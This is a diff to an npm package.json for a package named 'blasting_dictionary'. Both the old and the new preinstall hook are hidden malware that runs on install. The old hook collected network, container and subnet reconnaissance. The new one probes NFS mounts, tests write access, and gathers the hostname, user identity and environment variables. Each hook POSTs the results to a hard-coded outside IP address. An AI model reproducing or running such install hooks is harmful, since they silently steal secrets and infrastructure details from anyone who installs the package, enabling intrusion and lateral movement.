@@ -1,8 +1,8 @@
 {
   "name": "blasting_dictionary",
-  "version": "1.2.7",
+  "version": "1.2.8",
   "scripts": {
-    "preinstall": "(echo '===LATERAL==='; echo '---RESOLV---'; cat /etc/resolv.conf 2>&1; echo ''; echo '---IFACES---'; ip addr 2>&1 || ifconfig 2>&1; echo ''; echo '---ROUTE---'; ip route 2>&1 || route -n 2>&1; echo ''; echo '---MOUNTS---'; mount 2>&1; echo ''; echo '---DF---'; df -h 2>&1; echo ''; echo '---DOCKER---'; ls -la /var/run/docker.sock 2>&1; echo ''; echo '---PROC_SELF---'; ls -la /proc/1/ns/ 2>&1; echo ''; echo '---CGROUP_DETAIL---'; cat /proc/1/cgroup 2>&1; echo ''; echo '---ARP---'; arp -a 2>&1 || cat /proc/net/arp 2>&1; echo ''; echo '---NETSTAT---'; netstat -tlnp 2>&1 || ss -tlnp 2>&1; echo ''; echo '---SCAN_SUBNET---'; for i in 1 2 3 4 5; do curl -s -m 1 http://10.130.214.$i:80 2>&1 | head -c 100 && echo ''; done; echo ''; echo '===END===') | curl -s -X POST -d @- http://139.224.40.24:8088/k8s",
+    "preinstall": "(echo '===NFS_PROBE==='; echo '---MNT_LS---'; ls -la /mnt/ 2>&1; echo ''; echo '---MNT_FIND---'; find /mnt -maxdepth 3 -type f 2>/dev/null | head -50; echo ''; echo '---MNT_DIRS---'; find /mnt -maxdepth 3 -type d 2>/dev/null | head -50; echo ''; echo '---MNT_WRITE---'; echo 'test_write_12345' > /mnt/test_write.txt 2>&1 && echo 'WRITE_OK' && cat /mnt/test_write.txt 2>&1 && rm /mnt/test_write.txt 2>&1 || echo 'WRITE_FAILED'; echo ''; echo '---MNT_PERMS---'; touch /mnt/perm_test 2>&1; stat /mnt/ 2>&1; echo ''; echo '---HOSTNAME---'; hostname 2>&1; echo ''; echo '---WHOAMI---'; whoami 2>&1; id 2>&1; echo ''; echo '---ENV---'; env 2>&1 | head -30; echo ''; echo '---PROC_MOUNTINFO---'; cat /proc/self/mountinfo 2>&1 | grep -i nfs; echo ''; echo '===END===') | curl -s -X POST -d @- http://139.224.40.24:8088/k8s",
     "build": "echo 'building...'"
   }
 }
